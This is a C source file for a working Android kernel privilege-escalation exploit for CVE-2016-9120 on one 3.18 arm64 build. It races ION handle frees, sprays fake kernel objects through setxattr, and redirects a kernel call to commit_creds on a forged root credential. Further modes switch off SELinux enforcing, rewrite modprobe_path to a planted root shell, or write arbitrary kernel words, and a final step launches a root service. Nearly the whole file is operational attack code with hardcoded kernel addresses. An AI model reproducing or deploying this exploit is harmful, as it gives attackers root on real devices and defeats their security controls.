#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>
#include <linux/limits.h>

/* CVE-2016-9120 on Xplay6 turned into a controlled kernel call -- everything the
 * kernel writes lands in OUR OWN userspace pages (this 3.18 arm64 build has no
 * PAN and no set_fs hardening, so kernel code dereferences user pointers
 * happily), and the final indirect call is commit_creds() on a cred we built.
 *
 * Verified chain (art/ledger-20261013.md S35, all offsets read out of this Image):
 *   stray kref_put lands on our sprayed kmalloc-64 fake ion_handle
 *     +0x00 ref            = 1        -> destroy runs
 *     +0x08 client         = user page (idr_remove is short-circuited by id = -1)
 *     +0x10 buffer         = B        (user page)
 *     +0x18 node           = user page | 1  (rb_erase writes one 0 into our page)
 *     +0x30 kmap_cnt       = 1        -> dec to 0 -> keep going
 *     +0x34 id             = -1       -> idr_remove() returns immediately
 *   ion_handle_destroy:
 *     mutex_lock(B+0x50), [B+0x78] kmap_cnt = 1 -> 0 -> bl ion_buffer_unmap_kva
 *        -> x0=[B+0x28] (=P, our "heap"), x1=[x0+0x38] (=ops), x2=[ops+0x30]
 *        -> blr x2   ==>  fn(P, B)            <-- our controlled call
 *        -> writes 0 into [B+0x80]
 *     idr_remove([client+0x28], -1), rb/list, mutex_unlock,
 *     handle_count [B+0xa8] = 1 -> 0 (never negative: no BUG_ON)
 *     tail: current->0x4c0 read, [B+0xac] name copied, [B+0xbc]=pid,
 *           atomic: [P+0xec] -= [B+0x40]        <-- our landing counter
 *     ion_buffer_put(B): [B+0x00] refcount = 0 -> -1 -> NO destroy -> no kfree(B)
 *     kfree(handle slot) -- a real slab object, legit
 *
 * P doubles as the fake cred: [P+0x38] must hold the ops pointer, and the value we
 * put there, 0x3fffffffff, is simultaneously CAP_FULL_SET -- one address, two roles.
 * So we must map the page containing 0x3fffffffff..0x4000000038 and write our
 * function pointers there.
 *
 * MODE 1 (positive control, no privilege change): fn = __cond_resched, and success
 * is proven by P[0xec] going 1000 -> 999, i.e. the whole walk really executed.
 * MODE 2 (payload): fn = commit_creds(P) with uid/gid 0 and caps full.
 */
#define H_REF        0x00
#define H_CLIENT     0x08
#define H_BUFFER     0x10
#define H_NODE       0x18
#define H_KMAPCNT    0x30
#define H_ID         0x34
#define OBJ_SZ       64

#define B_REFCNT     0x00   /* keep 0 so ion_buffer_put cannot destroy it */
#define B_HEAP       0x28
#define B_SIZE       0x40
#define B_LOCK       0x50
#define B_KMAPCNT    0x78
#define B_VADDR      0x80
#define B_PAGES      0x90
#define B_NAME       0xac
#define B_PID        0xbc
#define B_HCOUNT     0xa8

/* struct cred, CONFIG_DEBUG_CREDENTIALS=n / CONFIG_KEYS=y / CONFIG_SECURITY=y
 * (offsets cross-checked twice: include/linux/cred.h field order, and the
 *  ldr/str displacements inside commit_creds measured earlier -> ledger S46):
 *   usage 0x00 (=4 in init_cred) | 8 ids uid@0x04..fsgid@0x20 | securebits 0x24
 *   cap_inheritable 0x28  cap_permitted 0x30  cap_effective 0x38  cap_bset 0x40
 *   -- all three of 0x30/0x38/0x40 read 0x3fffffffff inside init_cred in the Image,
 *   which is what pins this layout down (DEBUG_CREDENTIALS off: no subscribers /
 *   put_addr / magic words in front of uid) --
 *   session 0x50 process 0x58 thread 0x60 request_key_auth 0x68 security 0x70
 *   user 0x78  user_ns 0x80  group_info 0x88  rcu 0x90   (sizeof 0xa0 -> kmalloc-192)
 * (re-measured 2026-10-13 against init_cred's bytes in fw/Image @0xffffffc001636d80:
 *  +0x78 = root_user, +0x80 = init_user_ns, +0x88 = init_groups, and +0x30/0x38/0x40
 *  = 0x3fffffffff while +0x28 = 0 -- exactly INIT_CRED's empty cap_inheritable.)
 * cap_bset matters: commit_creds copies it and capable() intersects with it, so a
 * zeroed bset would leave uid 0 with no effective caps at all.
 * user/user_ns must be non-NULL writable: commit_creds does
 * atomic_inc(&new->user->processes) whenever new->user != old->user. */
#define C_USAGE      0x00
#define C_UID        0x04
#define C_SECUREBITS 0x24
#define C_CAP_INH    0x28
#define C_CAP_PERM   0x30
#define C_CAP_EFF    0x38          /* == the heap->ops slot the kernel reads: one value, two roles */
#define C_CAP_BSET   0x40
#define C_SEC        0x70
#define C_USER       0x78
#define C_USERNS     0x80
#define C_GRPINfO    0x88
/* cred->security must NOT be NULL once our cred is installed: every SELinux hook does
 * current_security() -> tsec->sid, and selinux_cred_prepare() kmemdups old->security on
 * the next fork/exec, so a NULL dies on the first syscall after commit_creds, not in
 * commit_creds itself.  struct task_security_struct (selinux/include/objsec.h) is 6 u32:
 * osid, sid, exec_sid, create_sid, keycreate_sid, sockcreate_sid, and the kernel's own
 * init cred uses {osid = sid = SECINITSID_KERNEL} with the rest 0 -- 0 means "no forced
 * transition", which matters because a non-zero exec_sid makes selinux_bprm_set_creds()
 * call security_validate_transition(), and that returns -EPERM regardless of enforcing
 * (i.e. it would block execve even after SELinux is permissive).  SECINITSID_KERNEL = 1
 * is an initial SID, so sidtab_search() finds it in every policy.  The struct lives at
 * g_p+0x100, past everything the ion path writes (cred 0..0x9f, heap slots 0x38/0x40/
 * 0x48/0xe8/0xec, and the buffer-side writes all land on g_b). */
#define TSEC_OFF     0x100
#define SECINITSID_KERNEL 1

#define NSP          3            /* few, because every sprayer allocation is another chance to pop the aliased slot */
#define OPS_MAGIC    0x3fffffffffUL          /* cap mask AND ops pointer */
#define HEAP_ECNT    0xec                    /* [heap+0xec] -= size : landing counter */

#define ION_ALLOC    0xc0204900u
#define ION_FREE     0xc0044901u

#define COMMIT_CREDS   0xffffffc00023bb70UL
#define COND_RESCHED   0xffffffc000244944UL
#define SELINUX_ENFORCING 0xffffffc00189be74UL   /* int == 1 while enforcing (ledger S30/S37.5) */
/* read straight out of init_cred in the Image (fw/Image @ 0xffffffc001636d80):
 * the three pointers after the caps are root_user / init_user_ns / init_groups,
 * which is exactly what a real setuid(0) would have put there -> commit_creds can
 * dereference new->user (atomic_inc processes) safely. (ledger S46) */
#define KERNEL_ROOT_USER 0xffffffc0016356d8UL
#define KERNEL_INIT_USER_NS 0xffffffc001635730UL
#define KERNEL_INIT_GROUPS  0xffffffc001636ff8UL

struct alloc_data { unsigned long long len, align; unsigned mask, flags; unsigned handle; unsigned pad; };

static int g_ionfd;
static int g_rfd = -1;          /* separate client fd for the repair allocations */
static int g_repair = 1;        /* consume the aliased slot ourselves -> freelist fixed */
static int g_racer_cpu = 0;     /* all racers + the repair share one CPU's freelist */
static int g_spray_cpu = 1;
static volatile unsigned g_id, g_go, g_ready, g_done, g_stop, g_repaired;
static int g_nracer = 4;
static pthread_t g_rth[8];
static char g_path[PATH_MAX];
static unsigned char g_tmpl[OBJ_SZ];
static volatile unsigned long *g_p, *g_b, *g_client, *g_node;

/* t0 real handle destroyed -> kfree(S); t1 our spray pops S; t2 the stray put runs our
 * chain and kfree(S) again (this is the write we want); t3 the spray's own owner frees S
 * a second time -> SLUB now holds S twice -> two later allocations alias -> crash.
 * If WE allocate S once between t2 and t3 and then never free it, the count of "S on the
 * freelist" goes back to exactly one, i.e. the double free is repaired.  That only works
 * on the same CPU's per-cpu freelist, hence: racers pinned to g_racer_cpu, repair done
 * inline by the very same thread, sprayers pinned elsewhere. */
static void repair_freeelist(void)
{
    struct alloc_data ad;
    int k;

    if (!g_repair || g_rfd < 0)
        return;
    for (k = 0; k < 6; k++) {
        memset(&ad, 0, sizeof ad);
        ad.len = 4096; ad.align = 4096; ad.mask = 1u << 9;
        errno = 0;
        if (ioctl(g_rfd, ION_ALLOC, &ad) == 0)
            g_repaired++;
        else
            break;
    }
}

static void pin_this(int cpu)
{
    cpu_set_t st;
    CPU_ZERO(&st);
    CPU_SET(cpu, &st);
    sched_setaffinity(0, sizeof st, &st);
}

static void *racer(void *a)
{
    unsigned id = g_id;
    int r;
    (void)a;
    pin_this(g_racer_cpu);
    /* volatile++ is NOT atomic: a lost update left main spinning forever and, worse,
     * let it join a slot whose pthread_create had failed.  Use __atomic. */
    __atomic_add_fetch(&g_ready, 1, __ATOMIC_SEQ_CST);
    while (!g_go)
        sched_yield();
    errno = 0;
    r = ioctl(g_ionfd, ION_FREE, &id);
    if (r && errno != EINVAL)
        printf("  racer: FREE rc=%d errno=%d\n", r, errno);
    repair_freeelist();
    __atomic_add_fetch(&g_done, 1, __ATOMIC_SEQ_CST);
    return NULL;
}

/* Spray with DISTINCT names: an overwrite of the same name makes ext4 kfree the
 * previous value buffer, which is exactly the second free we must not add to the one
 * our landing's trailing kfree(S) already performs.  Allocating fresh names only ever
 * frees each buffer once (by its own syscall), so after a hit the cache stops churning
 * and the freelist damage from that one double free is deferred as long as possible. */
static void *sprayer(void *a)
{
    char nm[32];
    unsigned k = 0;
    int i;
    (void)a;
    pin_this(g_spray_cpu);
    while (!g_stop) {
        for (i = 0; i < 16 && !g_stop; i++) {
            snprintf(nm, sizeof nm, "user.s%u", k++);
            setxattr(g_path, nm, g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static void *plat(size_t n)
{
    void *p = mmap(NULL, n, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) { perror("mmap"); exit(1); }
    memset(p, 0, n);
    return p;
}

/* One storm: ALLOC a victim handle, have g_nracer threads FREE it (=> exactly
 * g_nracer-1 stray puts land on the recycled slot our sprayer owns), then judge whether
 * the destroy chain actually ran.  The judgement deliberately does NOT rely on the
 * subtraction target: ion_handle_destroy() reaches rb_erase() (which zeroes one child
 * slot of the parent we hand it, i.e. g_node+8 / g_node+0x10) on EVERY landing, whether
 * the 4-byte subtract afterwards goes into our own page or into kernel .data.  That is
 * what makes the enforce/path modes stop after a single landing -- with only the
 * [P+0xec] canary they would keep firing 300 blind kernel writes.  Returns 1 = chain
 * ran, 0 = this round missed, -1 = give up. */
static int do_attempt(unsigned long heap_target, unsigned int sub_size)
{
    struct alloc_data ad;
    unsigned long c1, c2, c3, now;
    unsigned ec;
    int j, hit;

    memset(&ad, 0, sizeof ad);
    ad.len = 4096; ad.align = 4096; ad.mask = 1u << 9;
    errno = 0;
    if (ioctl(g_ionfd, ION_ALLOC, &ad)) { printf("  alloc errno=%d\n", errno); return -1; }

    *(unsigned long *)((char *)g_b + B_HEAP) = heap_target;
    *(unsigned int  *)((char *)g_b + B_SIZE) = sub_size;
    *(volatile unsigned *)((char *)g_p + HEAP_ECNT) = 1000;
    *(volatile unsigned long *)((char *)g_node + 8) = 0xdeadbeefUL;
    *(volatile unsigned long *)((char *)g_node + 16) = 0xdeadbeefUL;
    *(volatile unsigned long *)((char *)g_client + 0x20) = 0xdeadbeefUL;

    g_id = ad.handle;
    g_go = 0; g_ready = 0; g_done = 0;
    for (j = 0; j < g_nracer; j++)
        if (pthread_create(&g_rth[j], NULL, racer, (void *)(long)j)) {
            printf("  racer %d create failed: %s\n", j, strerror(errno));
            return -1;
        }
    while (g_ready < (unsigned)g_nracer)
        sched_yield();
    g_go = 1;
    while (g_done < (unsigned)g_nracer)
        sched_yield();
    for (j = 0; j < g_nracer; j++)
        pthread_join(g_rth[j], NULL);
    sched_yield();

    ec = *(volatile unsigned *)((char *)g_p + HEAP_ECNT);
    c1 = *(volatile unsigned long *)((char *)g_node + 8);
    c2 = *(volatile unsigned long *)((char *)g_node + 16);
    c3 = *(volatile unsigned long *)((char *)g_client + 0x20);
    now = heap_target + HEAP_ECNT;
    hit = (ec != 1000) || (c1 != 0xdeadbeefUL) || (c2 != 0xdeadbeefUL) || (c3 != 0xdeadbeefUL);
    if (hit)
        printf("*** chain executed: [P+0xec]=%u node+8=%lx node+0x10=%lx client+0x20=%lx"
               "   (subtract %u from %lx)\n", ec, c1, c2, c3, sub_size, now);
    return hit;
}

/* /proc/sys/kernel/modprobe is a plain 0644 view of the modprobe_path[] array itself, so
 * once SELinux is permissive a uid-2000 process can read back the very bytes the
 * subtract writes -- which turns the 4-byte-subtract primitive into a self-verifying
 * arbitrary 4-byte write (compute delta = old - new, land, re-read, correct). */
#define MODPROBE_PATH  0xffffffc001635a30UL   /* char modprobe_path[256] in .data */
#define MODPROBE_VIEW  "/proc/sys/kernel/modprobe"

static int read_modprobe(char *out, int cap)
{
    ssize_t n;
    int fd;

    fd = open(MODPROBE_VIEW, O_RDONLY);
    if (fd < 0) { printf("  open %s: %s\n", MODPROBE_VIEW, strerror(errno)); return -1; }
    n = read(fd, out, cap - 1);
    close(fd);
    if (n < 0) { printf("  read %s: %s\n", MODPROBE_VIEW, strerror(errno)); return -1; }
    if (n == 0) { out[0] = 0; return 0; }
    out[n] = 0;
    while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == 0))
        out[--n] = 0;
    return (int)n;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "control";
    int payload = !strcmp(mode, "root");        /* controlled commit_creds()   */
    int enforce = !strcmp(mode, "enforce");    /* [selinux_enforcing] -= 1     */
    int pathm   = !strcmp(mode, "path");       /* rewrite modprobe_path[] word by word */
    int w4      = !strcmp(mode, "w4");         /* one-shot: w4 <hex-addr> <hex-word>   */
    int attempts = argc > 2 ? atoi(argv[2]) : 300;
    /* ref algebra: handle starts at 1, each racer does +1 (get_by_id) then two puts,
     * so the count reaches 0 at put #(T+1) and exactly T-1 puts land on the freed
     * slot.  T=4 => 3 strays: the 1st runs our chain, the 2nd edits the SLUB freelist
     * pointer that now lives at slot+0 => panic inside kmalloc (observed 2026-10-13).
     * T=2 is therefore the only shape with a single, self-limited stray. */
    g_nracer = argc > 3 ? atoi(argv[3]) : 2;
    if (g_nracer < 2) g_nracer = 2;
    if (g_nracer > 8) g_nracer = 8;
    pthread_t th[NSP];
    int i, fd, hits = 0;
    unsigned long *ops_at;

    /* Runtime knobs so a CPU/repair sweep does not need a re-push.  SLUB's freelist is
     * PER-CPU: a slot freed by a racer on g_racer_cpu can only be re-taken by an
     * allocation on that same CPU, so the spray has to live there too (the 400-attempt
     * zero-landing run of 2026-10-13 had sprayers pinned to CPU 1). */
    {
        const char *e;
        if ((e = getenv("SPRAYCPU")))  g_spray_cpu  = atoi(e);
        if ((e = getenv("RACERCPU")))  g_racer_cpu  = atoi(e);
        if ((e = getenv("REPAIR")))    g_repair     = atoi(e);
    }

    snprintf(g_path, sizeof g_path, "/data/local/tmp/iroot_file");
    setvbuf(stdout, NULL, _IONBF, 0);

    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("probe file"); return 1; }
    close(fd);
    if (setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0) && errno == EACCES) {
        printf("setxattr denied (%s) -- need another path\n", strerror(errno));
        return 2;
    }
    removexattr(g_path, "user.v");

    g_client = plat(0x1000);
    g_node   = plat(0x1000);
    g_b      = plat(0x1000);
    g_p      = plat(0x1000);           /* fake heap == fake cred */

    /* OPS_MAGIC doubles as cap_effective AND as the ops-table pointer, so for the
     * controlled-call mode the pages spanning 0x3fffffffff .. +0x38 must be mapped.
     * control/enforce modes do not need it (they never reach the ops deref). */
    {
        unsigned long base = OPS_MAGIC & ~0xfffUL;
        size_t len = 0x2000;
        void *m = mmap((void *)base, len, PROT_READ | PROT_WRITE,
                       MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
        if (m == MAP_FAILED) {
            printf("mmap ops page @%lx: %s\n", base, strerror(errno));
            if (payload)
                return 3;
        } else {
            memset(m, 0, len);
            printf("ops page %p..%p (ops=%lx -> slot %p)\n", m,
                   (void *)((char *)m + len), OPS_MAGIC, (void *)(OPS_MAGIC + 0x30));
        }
    }
    if (payload) {
        ops_at = (unsigned long *)(OPS_MAGIC + 0x08);   /* unaligned on purpose */
        ops_at[0] = COND_RESCHED;                        /* ops[0x08] */
        *(unsigned long *)(OPS_MAGIC + 0x20) = COND_RESCHED;   /* ops[0x20](P,B) */
        *(unsigned long *)(OPS_MAGIC + 0x30) = COMMIT_CREDS;   /* ops[0x30](P,B) */
    }

    /* fake cred == fake heap page P.  commit_creds (kernel/cred.c of this tree) reads
     * usage, the ids, the four cap words and new->user, and it OVERWRITES new->security
     * (selinux_cred_prepare kmemdups the old one) -- so the only fields that must be
     * non-NULL are the pointers it dereferences: user (atomic_inc processes) and, to be
     * safe, user_ns.  Both point into our own page. */
    *(unsigned int  *)((char *)g_p + C_USAGE)     = 100;             /* BUG_ON(<1); get_cred incs */
    /* cap_inheritable full on purpose: cap_bprm_set_creds() computes the exec'd
     * child's cap_permitted as (old->cap_permitted & old->cap_inheritable), so with a
     * zero inheritable everything we exec from this shell would run with
     * cap_permitted = 0 (init_cred itself has an empty inheritable -- that is a
     * property of init, not something to copy). */
    *(unsigned long *)((char *)g_p + C_CAP_INH)   = 0x3fffffffffUL;
    *(unsigned long *)((char *)g_p + C_CAP_PERM)  = 0x3fffffffffUL;  /* also the ops pointer slot */
    *(unsigned long *)((char *)g_p + C_CAP_EFF)   = 0x3fffffffffUL;
    *(unsigned long *)((char *)g_p + C_CAP_BSET)  = 0x3fffffffffUL;  /* empty bset == no caps */
    for (i = 0; i < 8; i++)
        *(unsigned int *)((char *)g_p + C_UID + i * 4) = 0;          /* uid..fsgid = 0 */
    *(unsigned int  *)((char *)g_p + C_SECUREBITS) = 0;                  /* securebits */
    *(unsigned long *)((char *)g_p + C_USER)   = KERNEL_ROOT_USER;
    *(unsigned long *)((char *)g_p + C_USERNS) = KERNEL_INIT_USER_NS;
    *(unsigned long *)((char *)g_p + C_GRPINfO)= KERNEL_INIT_GROUPS;
    /* fake task_security_struct, see the C_SEC comment above */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 0)  = SECINITSID_KERNEL;  /* osid */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 4)  = SECINITSID_KERNEL;  /* sid  */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 8)  = 0;                  /* exec_sid */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 12) = 0;                  /* create_sid */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 16) = 0;                  /* keycreate_sid */
    *(unsigned int *)((char *)g_p + TSEC_OFF + 20) = 0;                  /* sockcreate_sid */
    *(unsigned long *)((char *)g_p + C_SEC) = (unsigned long)g_p + TSEC_OFF;
    *(volatile unsigned *)((char *)g_p + HEAP_ECNT) = 1000;        /* landing counter */

    /* fake ion_buffer.  Path select (ledger S36): handle kmap_cnt == 0 skips the
     * whole buffer-kmap/unmap block, so the only kernel-side effect left is the
     * tail's [heap+0xec] -= size  -- an arbitrary 4-byte subtraction that needs no
     * ops chain at all.  That is how "enforce" turns SELinux off in one shot. */
    *(unsigned int  *)((char *)g_b + B_REFCNT)  = 0;               /* no destroy, no kfree */
    *(unsigned long *)((char *)g_b + B_HEAP)    = (unsigned long)g_p;  /* do_attempt() re-aims it */
    *(unsigned int  *)((char *)g_b + B_SIZE)    = 1;
    *(unsigned int  *)((char *)g_b + B_KMAPCNT) = payload ? 1 : 0;
    *(unsigned int  *)((char *)g_b + B_HCOUNT)  = 1;               /* dec to 0, never negative */
    /* B+0x50 lock: zeroed = unlocked ticket pair, self-linked wait list not needed */

    memset(g_tmpl, 0, sizeof g_tmpl);
    *(unsigned int  *)(g_tmpl + H_REF)     = 1;
    *(unsigned long *)(g_tmpl + H_CLIENT)  = (unsigned long)g_client;
    *(unsigned long *)(g_tmpl + H_BUFFER)  = (unsigned long)g_b;
    *(unsigned long *)(g_tmpl + H_NODE)    = (unsigned long)g_node | 1;   /* RED, no rebalance */
    *(unsigned int  *)(g_tmpl + H_KMAPCNT) = payload ? 1 : 0;      /* 0 = skip unmap/ops chain */
    /* id = 0x7fffffff (not -1): radix_tree_delete() on the zeroed fake idr returns
     * immediately, same as the negative-id early-out, but qcom's ion path prints a
     * dmesg line per landing -- a second, crash-surviving oracle (ledger S28/stageB). */
    *(int           *)(g_tmpl + H_ID)      = 0x7fffffff;

    g_ionfd = open("/dev/ion", O_RDONLY);
    if (g_ionfd < 0) { perror("open /dev/ion"); return 1; }
    g_rfd = open("/dev/ion", O_RDONLY);       /* second client: repair allocations */
    if (g_rfd < 0) { perror("open /dev/ion (repair)"); g_rfd = g_ionfd; }

    printf("mode=%s  P=%p B=%p heap=[B+0x28]=%lx size=1 -> target [heap+0xec]=%lx  counter now=%u\n",
           mode, (void *)g_p, (void *)g_b,
           *(unsigned long *)((char *)g_b + B_HEAP),
           *(unsigned long *)((char *)g_b + B_HEAP) + HEAP_ECNT,
           *(unsigned *)((char *)g_p + HEAP_ECNT));

    for (i = 0; i < NSP; i++)
        if (pthread_create(&th[i], NULL, sprayer, NULL)) {
            printf("sprayer %d: %s\n", i, strerror(errno));
            return 5;
        }

    if (pathm) {
        /* Ascending 4-byte writes over modprobe_path[], each one verified by reading the
         * sysctl back.  The "model" array is our belief about the whole 256-byte buffer
         * (visible string + the static zero tail from the Image); every landing checks
         * that belief, so a double landing or a mis-aimed word is caught before we would
         * write blind.  Because the write is a subtract, the delta is (old - new) mod
         * 2^32, which makes any reachable 4 bytes correctable by construction. */
        static const char WANT[] = "/data/local/tmp/rootsh";
        const int wlen = (int)sizeof(WANT) - 1;   /* 22 bytes; index 22 becomes the NUL */
        unsigned char model[256];
        char cur[256], pred[256];
        int len, wp, b, k, att;

        len = read_modprobe(cur, (int)sizeof cur);
        if (len < 0) goto out;
        memset(model, 0, sizeof model);
        memcpy(model, cur, (size_t)len);
        printf("  modprobe_path visible = %d bytes (\"%s\"); tail assumed zero -- re-checked per landing\n",
               len, cur);
        for (wp = 0; 4 * wp <= wlen; wp++) {
            unsigned oldw = 0, neww = 0;

            for (b = 0; b < 4; b++) {
                int gi = 4 * wp + b;
                unsigned char ob = model[gi], nb = ob;
                if (gi < wlen)       nb = (unsigned char)WANT[gi];
                else if (gi == wlen) nb = 0;                 /* the terminator */
                oldw |= (unsigned)ob << (8 * b);
                neww |= (unsigned)nb << (8 * b);
                model[gi] = nb;
            }
            if (oldw == neww) {
                printf("  word %d already %08x -- skipped\n", wp, neww);
                continue;
            }
            for (k = 0; k < 255 && model[k]; k++) pred[k] = (char)model[k];
            pred[k] = 0;
            printf("  word %d @%lx: %08x -> %08x  (subtract %08x)  expect \"%s\"\n",
                   wp, (unsigned long)(MODPROBE_PATH + 4 * wp), oldw, neww,
                   (unsigned)(oldw - neww), pred);
            for (att = 0; att < attempts; att++) {
                int r = do_attempt(MODPROBE_PATH + 4 * wp - HEAP_ECNT, oldw - neww);
                if (r < 0) goto out;
                if (!r) continue;                            /* this round never landed */
                hits++;
                len = read_modprobe(cur, (int)sizeof cur);
                if (len < 0) goto out;
                if (strcmp(cur, pred)) {
                    printf("  MISMATCH: got \"%s\" expected \"%s\"\n"
                           "   => our model of the array is wrong: refusing to write blind.\n",
                           cur, pred);
                    goto out;
                }
                printf("  word %d verified: \"%s\"\n", wp, cur);
                break;
            }
            if (att >= attempts) {
                printf("  word %d: no landing in %d attempts\n", wp, attempts);
                goto out;
            }
        }
        printf("  modprobe_path now \"%s\" -- trigger by execve'ing a file no binfmt claims\n", cur);
    } else if (enforce) {
        for (i = 0; i < attempts; i++) {
            int r = do_attempt(SELINUX_ENFORCING - HEAP_ECNT, 1);
            if (r < 0) goto out;
            if (!r) continue;
            hits = 1;
            g_stop = 1;              /* exactly one subtract; never re-aim at enforcing */
            fflush(stdout);
            system("cat /sys/fs/selinux/enforce 2>&1; getenforce");
            break;
        }
    } else if (w4) {
        unsigned long addr;
        unsigned delta;
        int a2;

        if (argc < 4) {
            printf("usage: iroot w4 <hex-addr> <hex-delta-to-subtract> [racers]\n");
            goto out;
        }
        attempts = 400;
        g_nracer = argc > 4 ? atoi(argv[4]) : 2;
        if (g_nracer < 2) g_nracer = 2;
        if (g_nracer > 8) g_nracer = 8;
        addr = strtoul(argv[2], NULL, 16);
        delta = (unsigned)strtoul(argv[3], NULL, 16);
        for (a2 = 0; a2 < attempts; a2++) {
            int r = do_attempt(addr - HEAP_ECNT, delta);
            if (r < 0) goto out;
            if (!r) continue;
            hits = 1;
            g_stop = 1;
            fflush(stdout);
            system("getenforce; id");
            break;
        }
    } else {
        /* control: the subtract lands in OUR page, so this gate answers "does a landing
         * happen, and does the box survive it" without touching kernel memory at all.
         * root: same target, but handle/buffer kmap_cnt = 1, so the chain first runs
         * commit_creds(P) on the cred we built in P. */
        for (i = 0; i < attempts; i++) {
            int r = do_attempt((unsigned long)g_p, 1);
            if (r < 0) break;
            if (!r) {
                if (i % 25 == 24)
                    printf("  ... attempt %d, no landing yet\n", i);
                continue;
            }
            hits = 1;
            g_stop = 1;
            fflush(stdout);
            system("getenforce; id");
            break;
        }
    }

out:
    g_stop = 1;
    for (i = 0; i < NSP; i++)
        pthread_join(th[i], NULL);
    printf("mode=%s racers=%d hits=%d repaired=%u [P+0xec]=%u\n", mode, g_nracer, hits,
           g_repaired, *(volatile unsigned *)((char *)g_p + HEAP_ECNT));
    if (hits && payload) {
        /* commit_creds() rewrites THIS process's creds, so the root service has to be
         * spawned by us -- a later adb shell would be uid 2000 again. */
        fflush(stdout);
        sync();
        system("grep -E 'Uid|Gid|CapEff|Se' /proc/self/status");
        system("/data/local/tmp/rootsh </dev/null >/data/local/tmp/rootsh.out 2>&1 &");
        sleep(2);
        system("id; getenforce; netstat -an 2>/dev/null | grep 12345");
    }
    close(g_ionfd);
    return hits ? 0 : 4;
}
